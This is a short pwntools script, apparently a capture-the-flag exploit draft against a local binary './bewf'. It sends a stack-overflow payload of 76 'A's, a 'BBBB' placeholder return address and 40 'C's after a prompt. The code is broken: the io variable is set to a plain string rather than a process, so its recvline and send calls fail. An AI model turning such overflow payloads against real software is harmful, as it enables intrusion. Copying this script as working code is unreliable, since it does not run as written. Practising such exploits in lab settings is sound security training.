#!/usr/bin/env python
from pwn import *
import sys


#url =  sys.argv[1]
#port = sys.argv[2]

io = "./bewf"

#io = remote (url, port)
io.recvline()

io.recvuntil("chood?")
#payload

payload = "A"*76 + "BBBB" + "C"*40


io.send(payload)
io.recvline()
